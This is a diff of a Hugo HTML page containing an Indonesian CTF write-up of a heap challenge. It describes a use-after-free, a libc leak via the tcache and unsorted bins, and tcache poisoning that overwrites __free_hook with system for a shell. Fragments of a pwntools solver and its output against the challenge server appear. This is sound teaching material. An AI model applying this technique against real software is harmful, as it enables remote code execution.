-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">edit_config</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">int</span> a2)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">edit_config</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">int</span> a2)
 {
     <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>v2; <span style="color:#75715e">// rbx@1
 </span><span style="color:#75715e"></span>    <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// rbx@1
@@ -1118,23 +591,9 @@ flag <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>
     puts(<span style="color:#e6db74">&#34;Config Edited.&#34;</span>);
     <span style="color:#66d9ef">return</span> v11 <span style="color:#f92672">-</span> <span style="color:#f92672">*</span>MK_FP(__FS__, <span style="color:#ae81ff">40LL</span>);
 }
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="print-config">Print Config</h2>
+</code></pre></div><h2 id="print-config">Print Config</h2>
 <p>Hanya melakukan printing data-data config yang sudah dialokasikan.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">print_config</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">int</span> a2)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">print_config</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">int</span> a2)
 {
     putchar(<span style="color:#ae81ff">10</span>);
     printf(<span style="color:#e6db74">&#34;ID: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">**</span>(<span style="color:#ae81ff">8LL</span> <span style="color:#f92672">*</span> a2 <span style="color:#f92672">+</span> a1));
@@ -1142,9 +601,7 @@ flag <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>
     printf(<span style="color:#e6db74">&#34;Is active: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>(<span style="color:#ae81ff">8LL</span> <span style="color:#f92672">*</span> a2 <span style="color:#f92672">+</span> a1) <span style="color:#f92672">+</span> <span style="color:#ae81ff">16LL</span>));
     <span style="color:#66d9ef">return</span> putchar(<span style="color:#ae81ff">10</span>);
 }
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="remove-last">Remove Last</h2>
+</code></pre></div><h2 id="remove-last">Remove Last</h2>
 <p>Melakukan <em>free</em> terhadap data yang terakhir kali dialokasikan.</p>
 <h2 id="bug">Bug</h2>
 <p>Ya, bug-nya terdapat di edit dan print. Disana tidak ada pengecekan bahwa data sudah di free atau belum. Ini menimbulkan <em>use-after-free</em>. Tapi use-after-free disini terhadap index yang terakhir di-free. Sebagai contoh:</p>
@@ -1218,87 +675,7 @@ Is active: <span style="color:#ae81ff">0</span>
 <p>Leak bisa didapatkan dengan memenuhi <em>tcache-bins</em>. Yaitu dengan alloc 8 chunks, lalu free semuanya. 7 chunks akan memenuhi <em>tcache-bins</em> dan chunk terakhir yang difree akan berisi sisa-sisa pointer <em>unsorted-bin</em> yang berisi alamat <em>main_arena</em>. Nah karena <em>main_arena</em> itu letaknya di-libc, maka dengan <em>use-after-free</em> yaitu dengan print index ini akan mendapatkan libc leak!</p>
 <p>Setelah itu, tinggal <em>tcache poisoning</em>. Overwrite <code>__free_hook</code> dengan <code>system</code>. Free chunk yang menyimpan string <code>/bin/sh</code> untuk mendapatkan RCE.</p>
 <p>Full solver,</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
 
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
@@ -1374,33 +751,8 @@ gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;
     <span style="color:#66d9ef">else</span>:
         r <span style="color:#f92672">=</span> process(ELF_PATH, aslr<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
     exploit(r)
-</code></pre></td></tr></table>
-</div>
-</div><p>profit.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to challenge.ctf.games on port 31213: Done
+</code></pre></div><p>profit.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to challenge.ctf.games on port 31213: Done
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> LEAK 0x7f6fb0456ca0
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> LIBC 0x7f6fb006b000
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
@@ -1419,9 +771,7 @@ flag<span style="color:#f92672">{</span>dc75c408f5ba2fbc72b307987dddc775<span st
 
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Interrupted
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to challenge.ctf.games port <span style="color:#ae81ff">31213</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="flag-4">Flag</h2>
+</code></pre></div><h2 id="flag-4">Flag</h2>
 <p><code>flag{dc75c408f5ba2fbc72b307987dddc775}</code></p>
 <p>Akhir kata, nice challanges <em>buat aku</em>. Source soal dan solver bisa di download <a href="../source/source.zip">disini</a>, thanks.</p>
 
@@ -1460,7 +810,7 @@ flag<span style="color:#f92672">{</span>dc75c408f5ba2fbc72b307987dddc775<span st
             </figure>
 			
 			<span>
-			&copy; <time datetime="2021-02-27 10:40:06.638284167 &#43;0700 WIB m=&#43;1.611650337">2021</time> . Made with <a href='https://gohugo.io'>Hugo</a> using the <a href='https://github.com/EmielH/tale-hugo/'>Tale</a> theme.
+			&copy; <time datetime="2021-03-10 14:52:01.903188349 &#43;0700 WIB m=&#43;0.202108985">2021</time> . Made with <a href='https://gohugo.io'>Hugo</a> using the <a href='https://github.com/EmielH/tale-hugo/'>Tale</a> theme.
 			</span>
 		</footer>
 
